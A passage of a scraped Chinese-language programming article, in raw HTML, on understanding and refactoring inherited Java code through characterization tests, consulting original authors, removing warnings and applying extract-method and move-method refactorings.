class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-12\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">exactly30AndNettingThresholdEnsureUnsuccessful</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-13\">        <span class=\"crayon-i\">Person</span> <span class=\"crayon-i\">person</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-r\">new</span> <span class=\"crayon-e\">Person</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">THRESHOLD_NET_SALARY</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-14\">        <span class=\"crayon-st\">Assert</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">assertFalse</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span> <span class=\"crayon-e\">SuccessfulFilter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-15\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-17\">    <span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/q1531454480'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Test</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-18\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">under30AndNettingLessThanThresholdEnsureSuccessful</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-19\">        <span class=\"crayon-i\">Person</span> <span class=\"crayon-i\">person</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-r\">new</span> <span class=\"crayon-e\">Person</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">29</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">THRESHOLD_NET</span><span class=\"crayon-sy\">_</span>SALARY <span class=\"crayon-o\">-</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-20\">        <span class=\"crayon-st\">Assert</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">assertFalse</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span> <span class=\"crayon-e\">SuccessfulFilter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-21\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-22\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0042 seconds] -->\r\n<p>通过这三个测试，我们已经对当前代码的工作方式了有大致了解：如果一个人不到 30 岁，每年能挣 $68,300，他就被认为是成功的。我们可以创建更多测试来确保功能在边缘情况（比如没有年龄或薪资）下的正确性。而且建成一套自动化测试之后，它可以用以确保我们对现有代码的修改不会破坏现有的功能。</p>\n<h3>使用现存测试</h3>\n<p>在现有代码中存在足够测试的情况下，我们也可以从测试中了解不少东西。就像我们创建测试一样，我们可以通过阅读测试从功能级别来了解代码是如何工作的。另外，我们也可以了解到<strong>原作者</strong>所理解的代码功能。就算测试不是原作者，而是其他人（在我们之前）写的，它仍然可以向我们提供其他人对代码意图的理解。</p>\n<p>即使现在的测试很有帮助，我们仍然要保持谨慎。我们很难判断测试是否和代码的变化保持一致。如果一致，我们就拥有理解代码的坚实基础；如果不一致，我们就必须小心不要被误导。比如，如果原薪资阈值是每年 $75,000，后来改为我们知道的 $68,330，那么这个过时的测试可能会把我们引入歧途：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc71b22f137278544\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;a href='http://www.jobbole.com/members/q1531454480'&gt;@Test&lt;/a&gt;\r\npublic void under30AndNettingThresholdEnsureSuccessful() {\r\n    Person person = new Person(29, 75000.0);\r\n    Assert.assertTrue(new SuccessfulFilter().test(person));\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22f137278544-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22f137278544-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22f137278544-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22f137278544-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22f137278544-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc71b22f137278544-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/q1531454480'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Test</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22f137278544-2\"><span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">under30AndNettingThresholdEnsureSuccessful</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22f137278544-3\">    <span class=\"crayon-i\">Person</span> <span class=\"crayon-i\">person</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-r\">new</span> <span class=\"crayon-e\">Person</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">29</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-cn\">75000.0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22f137278544-4\">    <span class=\"crayon-st\">Assert</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">assertTrue</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span> <span class=\"crayon-e\">SuccessfulFilter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22f137278544-5\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>这个测试仍然会通过，但不是预期的效果。它能通过不是因为<strong>正确的</strong>阈值，而是因为它超过了阈值。如果这个测试集中包括一个测试用例，其薪资只比阈值少 $1 时返回 false，那么第二个测试会失败，这表示阈值是错误的。如果套件没有这样的测试，那么旧的数据很容易对我们了解代码的实际意图产生误导。当存在疑问的时候，请相信代码：正如我们前端所展示的，解决阈值的问题表明测试并未针对<strong>实际的</strong>阈值。</p>\n<p>此外，参考代码库日志（比如 Git 日志）来了解代码和测试用例：如果最后更新代码的时间比最后更新测试的时间要新得多（并且代码中存在重大的代码，比如修改阈值），那么测试可能已经过时，需要谨慎对待。注意，不要完全忽略它们，因为它们还可能为我们提供一些原作者（或最近编写测试的开发者）的资料，不它们可能包含过时或错误的数据。</p>\n<h2>2. 和编写代码的人谈谈</h2>\n<p>在任何涉及多个人的工作中，沟通都至关重要。无论是在公司中、越野旅行中或是在项目中，缺少沟通都极易产生严重后果。尽管我们在创建新代码的时候进行沟通，但当我们接触既存代码时，风险还是会增加。因为我们对既存代码的了解有限，我们所了解的东西有可能受到了误导，也有可能过于片面，因此，为了真正理解现有的代码，我们需要与编写它的人交谈。</p>\n<p>在问问题的时候，我们要确保问题是有针对性的，能达到我们理解代码的目的。比如：</p>\n<ul>\n<li>这段代码对应于系统蓝图的哪个部分？</li>\n<li>你有没有相关的设计方案或图表？</li>\n<li>有我需要注意的坑吗？</li>\n<li>某个组件或类是做什么用的？</li>\n<li>有没有你本想写进代码，当时却没有写的东西？为什么？</li>\n</ul>\n<p>保持谦卑，从原作者那里寻找答案。几乎每个开发者都出现过这样的场景，他/她在那里看着别人的代码，问自己“他/她为什么要那样做？他们为什么不<strong>这么</strong>做？”然后花几个小时来得出本来只要原作者回答就能得到的结论。多数开发者都有能干的程序员，所以最好是假设我们看似糟糕的决定背后有个合理的理由（也可能没有，但在看别人代码的时候最好假设他有不错的理由；如果确实没有，我们可以通过重构来修改）。</p>\n<p>软件开发中，沟通也存在一定的副作用。康威定律，这个最初于 1967 年由 Melvin Conway 提出的定律：</p>\n<blockquote><p>任何在设计系统的组织…都不可避免的会产生设计，其结构是组织沟通结构的副本。</p></blockquote>\n<p>也就是说，一个大团队紧密沟通，就有可能产生整体的、紧密耦合的代码，而一组相对较小的团队可能会产生更多独立、松耦合的代码（更多相关信息，请阅读<a href=\"https://www.thoughtworks.com/insights/blog/demystifying-conways-law\" target=\"_blank\" rel=\"nofollow\">康威定律解密</a>）。对于我们来说，我们的通信结构不仅影响我们某段代码，还会影响整个代码库。因此，与原作者保持紧密的沟通是一个好办法，但我们应该避免过于依赖原作者。过分依赖会让原作者感厌烦，也可能在代码中产生不可预料的耦合。</p>\n<p>虽然这可能有助于深入研究我们的代码，但这是我们假设可以接触原作者的情况下。在很多时候，原作者可能已离开公司，或者不在身边的（例如休假）。我们在这种情况下要做什么呢？ 询问可能对此代码有想法的人。这并不一定是一个真正从事编码工作的人，但也可能是周围的某人或熟悉编写代码之人的人。只要从原作者身上得到哪怕一个想法，也有可能揭示一些代码中的未知片段。</p>\n<h2>3. 干掉所有警告</h2>\n<p>在心理学上有一个著名的概念叫“破窗理论”，这个理论由 Andrew Hunt 和 Dave Thomas 在<a href=\"https://www.amazon.com/Pragmatic-Programmer-Journeyman-Master/dp/020161622X\" target=\"_blank\" rel=\"nofollow\">程序员修炼之道</a>（4-6页）揭示。这一理论，最初发展自 James Q. Wilson 和 George L. Kelling：</p>\n<blockquote><p>想像一栋有几扇破窗户的建筑。如果窗户没有修好，那么破坏者会趋于打破更多窗户。最终甚至有人会强行进入这栋建筑，如果这栋建筑没有住人，它可能会被占用甚至会有人在里面生火。也可以想像一下堆积着一些枯枝落叶的人行道。很快，就会产生更多的垃圾。最终，人们逐渐会在那里扔掉外卖的垃圾袋甚至报废的汽车。</p></blockquote>\n<p>这一理论认为，人性会放弃照管某个似乎已经无人照管的事务。比如，人们更容易去破坏显得凌乱的建筑。就软件而言，如果开发人员发现代码已经是一团糟，那么继续搞乱就很正常。从本质上来说，我们对自己说（尽管字不太多），“如果前任都不在乎，我为什么要在乎？”或者“我搞乱的东西会被隐藏在这个烂摊子下面”。</p>\n<p>不过，这不应该成为我们的借口。我们应该停止推卸负责。一旦我们接触到他人留下的代码，就要对它负责，如果它出现问题，我们就得接受责问。为了确保我们能战胜这一人性发展的必须趋势，我们需要小步前进，逐步改善代码的凌乱状况（更换坏掉的窗户）。</p>\n<p>有一个简单的方法是去掉整个包或模块中的所有警告，删除掉未使用或注释掉的代码。如果我们以后需要这些代码，可以从代码库之前的提交中找到它。如果存在不能解决的警告（如原始类型警告），对方法或者其调用添加 @SuppressWarnings 注解。这确保我们对代码进行了深思熟虑：它们不是因为疏忽造成的警告，而是已经注意到的警告（比如原始类型）。</p>\n<p>一旦我们删除或明确禁止所有警告，我们必须确保代码保持无警告状态。这有两个主要的含义：</p>\n<ol>\n<li>它迫使我们对我们所创建的任何代码保持慎重。</li>\n<li>它减少了代码腐烂的改动，这样警告会导致以后的错误。</li>\n</ol>\n<p>这对他人或我们自己都有心理暗示作用，即我们是真的关心我们正在处理的代码。这不再是一个集合空间，其中我们盲目做出修改，提交，过后不再查看。相反，我们要对此代码的责任慎重一些。这也有助于未来的发展，向未来的开发者展示：这不是一个破窗的仓库：它是一个维护良好的代码库。</p>\n<h2>4. 重构</h2>\n<p>在过去几十年中，重构已经发展成为一个非常强大的述语，近年来它成为了变更工作代码的同义词。尽管重构确实涉及到对工作代码的修改，但这并不是它的完整意义。Martin Fowlerd 在它的开创性著作《<a href=\"https://www.amazon.com/Refactoring-Improving-Design-Existing-Code/dp/0201485672\" target=\"_blank\" rel=\"nofollow\">重构</a>》中将重构定义为：</p>\n<blockquote><p>对软件内部结构进行更改而不改变其表现的行为，使其更易于理解、更易于修改。</p></blockquote>\n<p>这个定义的关键在于它涉及的变化并不会改变系统的<strong>行为表现</strong>。也就是说，我们在重构代码的时候，必须保证代码对外部可见的行为不会发生变化。在我们的示例中就是指我们自己修改或创建的测试集。为了保证我们没有改变系统的外部行为，每次改变我们都应该重新编译并完整地进行测试。</p>\n<p>此外，并非我们所做的每一次修改都可以被认为是重构。比如，重命名一个方法使其更好的反映其用途是一种重构，它加入了新功能就不是。为了看到重构的好处，我们会重构 SuccessfulFilter。我们首先要使用<a href=\"https://refactoring.guru/extract-method\" target=\"_blank\" rel=\"nofollow\">抽取方法</a>这一重构手段来更好的封装计算个人净薪资的逻辑：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc71b238658554768\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic class SuccessfulFilter implements Predicate&lt;Person&gt; {\r\n\r\n    &lt;a href='http://www.jobbole.com/members/wx610506454'&gt;@Override&lt;/a&gt;\r\n    public boolean test(Person person) {\r\n        return person.getAge() &lt; 30 &amp;&amp; getNetSalary(person) &gt; 60000;\r\n    }\r\n\r\n    private double getNetSalary(Person person) {\r\n        return (((person.getSalary() - (250 * 12)) - 1500) * 0.94);\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b238658554768-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b238658554768-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b238658554768-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b238658554768-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b238658554768-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b238658554768-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b238658554768-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b238658554768-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b238658554768-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b238658554768-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b238658554768-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc71b238658554768-1\"><span class=\"crayon-m\">public</span> <span class=\"crayon-t\">class</span> <span class=\"crayon-e\">SuccessfulFilter</span> <span class=\"crayon-r\">implements</span> <span class=\"crayon-e\">Predicate</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">Person</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b238658554768-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b238658554768-3\">    <span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/wx610506454'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b238658554768-4\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">boolean</span> <span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">Person</span> <span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b238658554768-5\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">person</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getNetSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-cn\">60000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b238658554768-6\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b238658554768-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b238658554768-8\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-e\">getNetSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">Person</span> <span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b238658554768-9\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">person</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">-</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">250</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">-</span> <span class=\"crayon-cn\">1500</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-cn\">0.94</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b238658554768-10\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b238658554768-11\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>做出这个修改之后，重新编译并运行测试集，保持通过。现在的代码已经很容易看到成功的依据是年龄和净薪资，但是 getNetSalary 方法似乎并不属于 SuccessfulFilter，它应该是 Person 类（这样说是因为这个方法的唯一参数是 Person 对象，也只调用了 Person 的方法，所以它更接近 Person）。为了更好的放置这个方法，我们使用<a href=\"https://refactoring.guru/move-method\" target=\"_blank\" rel=\"nofollow\">移动方法</a>将它移动到 Person 类。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc71b23c635245938\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic class Person {\r\n\r\n    private int age;\r\n    private double salary;\r\n\r\n    public Person(int age, double salary) {\r\n        this.age = age;\r\n        this.salary = salary;\r\n    }\r\n\r\n    public void setAge(int age) {\r\n        this.age = age;\r\n    }\r\n\r\n    public int getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setSalary(double salary) {\r\n        this.salary = salary;\r\n    }\r\n\r\n    public double getSalary() {\r\n        return salary;\r\n    }\r\n\r\n    public double getNetSalary() {\r\n        return ((getSalary() - (250 * 12)) - 1500) * 0.94;\r\n    }\r\n}\r\n\r\npublic class SuccessfulFilter implements Predicate&lt;Person&gt; {\r\n\r\n    &lt;a href='http://www.jobbole.com/members/wx610506454'&gt;@Override&lt;/a&gt;\r\n    public boolean test(Person person) {\r\n        return person.getAge() &lt; 30 &amp;&amp; person.getNetSalary() &gt; 60000;\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-17\">17</div><div class=\"crayon-num crayon-striped-num\" 